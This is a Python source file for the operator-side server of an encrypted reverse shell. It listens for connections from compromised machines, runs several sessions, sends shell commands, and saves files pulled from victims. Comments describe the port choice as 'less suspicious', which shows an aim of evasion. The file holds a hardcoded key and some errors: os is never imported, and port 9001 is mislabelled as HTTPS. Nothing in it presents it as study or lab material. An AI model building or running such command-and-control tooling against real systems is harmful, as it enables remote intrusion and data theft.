#!/usr/bin/env python3
# aes_server_enhanced.py
import socket
import threading
import logging
import datetime
import random
from cryptography.fernet import Fernet

# --- Configuration ---
# MUST MATCH THE CLIENT KEY!
AES_KEY = b'jr8sI1WrJqL_5QyUe6j6H8V9g9vPKQO9v8lfdWpzhqk='  # CHANGE THIS IN PRODUCTION!
LISTEN_IP = '0.0.0.0'  # Listen on all interfaces
LISTEN_PORT = 9001      # Use common port (HTTPS)
MAX_CONNECTIONS = 10
CONNECTION_TIMEOUT = 120  # 2 minutes for international latency

cipher_suite = Fernet(AES_KEY)
active_sessions = {}
session_counter = 0

# Setup logging
logging.basicConfig(
    filename='reverse_shell.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def send_encrypted(sock, data):
    """Encrypts and sends data with length prefix"""
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        encrypted_data = cipher_suite.encrypt(data)
        length_prefix = len(encrypted_data).to_bytes(4, byteorder='big')
        sock.send(length_prefix + encrypted_data)
        return True
    except Exception as e:
        logging.error(f"Send error: {e}")
        return False

def recv_encrypted(sock):
    """Receives and decrypts data with length prefix"""
    try:
        length_data = sock.recv(4)
        if not length_data:
            return None
        encrypted_length = int.from_bytes(length_data, byteorder='big')
        
        encrypted_data = b''
        while len(encrypted_data) < encrypted_length:
            chunk = sock.recv(min(4096, encrypted_length - len(encrypted_data)))
            if not chunk:
                break
            encrypted_data += chunk
        
        if len(encrypted_data) != encrypted_length:
            return None
            
        return cipher_suite.decrypt(encrypted_data)
    except Exception as e:
        logging.error(f"Receive error: {e}")
        return None

def handle_client(client_socket, client_address, session_id):
    """Handles communication with a connected client"""
    global active_sessions
    
    print(f"[+] New connection from {client_address} (Session {session_id})")
    logging.info(f"New connection from {client_address} (Session {session_id})")
    
    client_socket.settimeout(CONNECTION_TIMEOUT)
    
    try:
        # Receive welcome message
        welcome_msg = recv_encrypted(client_socket)
        if welcome_msg:
            try:
                welcome_text = welcome_msg.decode()
                print(f"[+] Client {session_id}: {welcome_text}")
                logging.info(f"Session {session_id}: {welcome_text}")
            except:
                print(f"[+] Client {session_id} connected from {client_address}")
        
        while True:
            # Get command from server operator
            try:
                command = input(f"Shell[{session_id}]> ").strip()
            except EOFError:
                break
                
            if not command:
                continue
            
            # Server-side commands
            if command == "!background":
                print(f"[+] Session {session_id} backgrounded")
                break
                
            if command == "!help":
                print("\nServer Commands:")
                print("  !help         - Show this help")
                print("  !sessions     - List active sessions")
                print("  !kill <id>    - Terminate a session")
                print("  !background   - Background current session")
                print("  !quit         - Shutdown server")
                continue
                
            if command == "!sessions":
                print("\nActive Sessions:")
                for sid, (sock, addr) in active_sessions.items():
                    status = "connected" if not sock._closed else "disconnected"
                    print(f"  {sid}: {addr} ({status})")
                continue
                
            if command.startswith("!kill "):
                try:
                    kill_id = int(command.split()[1])
                    if kill_id in active_sessions:
                        sock, addr = active_sessions[kill_id]
                        sock.close()
                        del active_sessions[kill_id]
                        print(f"[+] Session {kill_id} terminated")
                    else:
                        print(f"[-] Session {kill_id} not found")
                except:
                    print("[-] Invalid session ID")
                continue
            
            if command == "!quit":
                print("[+] Shutting down server...")
                os._exit(0)
            
            # Send command to client
            if not send_encrypted(client_socket, command.encode()):
                print(f"[-] Failed to send command to session {session_id}")
                break
            
            if command.lower() in ['exit', 'quit']:
                print(f"[+] Sent exit command to session {session_id}")
                break
            
            # Receive command output from client
            output = recv_encrypted(client_socket)
            if output is None:
                print(f"[-] No response from session {session_id}")
                break
            
            # Handle file downloads
            if output.startswith(b"FILE_DATA:"):
                filename = input("Enter filename to save: ").strip()
                if filename:
                    try:
                        with open(filename, 'wb') as f:
                            f.write(output[10:])  # Skip the "FILE_DATA:" prefix
                        print(f"[+] File saved as {filename} ({len(output)-10} bytes)")
                        logging.info(f"Session {session_id} downloaded file: {filename}")
                    except Exception as e:
                        print(f"[-] Error saving file: {e}")
                else:
                    print("[-] No filename provided")
            else:
                try:
                    decoded_output = output.decode(errors='ignore')
                    print(decoded_output)
                    # Log command execution
                    if len(command) < 50:  # Don't log very long commands
                        logging.info(f"Session {session_id} executed: {command}")
                except:
                    print(f"[+] Received binary data ({len(output)} bytes)")
            
    except socket.timeout:
        print(f"[-] Session {session_id} timed out")
        logging.warning(f"Session {session_id} timed out")
    except Exception as e:
        print(f"[-] Error with session {session_id}: {e}")
        logging.error(f"Session {session_id} error: {e}")
    finally:
        client_socket.close()
        if session_id in active_sessions:
            del active_sessions[session_id]
        print(f"[+] Session {session_id} closed")
        logging.info(f"Session {session_id} closed")

def start_server():
    """Sets up and starts the listener server"""
    global session_counter
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((LISTEN_IP, LISTEN_PORT))
        server_socket.listen(MAX_CONNECTIONS)
        
        print(f"[*] AES Reverse Shell Server listening on {LISTEN_IP}:{LISTEN_PORT}")
        print(f"[*] Using port {LISTEN_PORT} (HTTPS - less suspicious)")
        print(f"[*] AES key: {AES_KEY.decode()}")
        print("[*] Waiting for incoming connections...")
        print("[*] Type '!help' for available commands")
        print("[*] Press Ctrl+C to stop the server\n")
        
        logging.info(f"Server started on {LISTEN_IP}:{LISTEN_PORT}")
        
        while True:
            client_socket, client_address = server_socket.accept()
            session_counter += 1
            current_session = session_counter
            
            active_sessions[current_session] = (client_socket, client_address)
            
            client_thread = threading.Thread(
                target=handle_client,
                args=(client_socket, client_address, current_session),
                daemon=True
            )
            client_thread.start()
            
            print(f"[*] New session {current_session} from {client_address}")
            print(f"[*] Active sessions: {len(active_sessions)}")
            
    except KeyboardInterrupt:
        print("\n[!] Server shutdown by user")
        logging.info("Server stopped by user")
    except Exception as e:
        print(f"[-] Server error: {e}")
        logging.error(f"Server error: {e}")
    finally:
        server_socket.close()
        # Close all active connections
        for sock, addr in active_sessions.values():
            try:
                sock.close()
            except:
                pass

if __name__ == "__main__":
    start_server()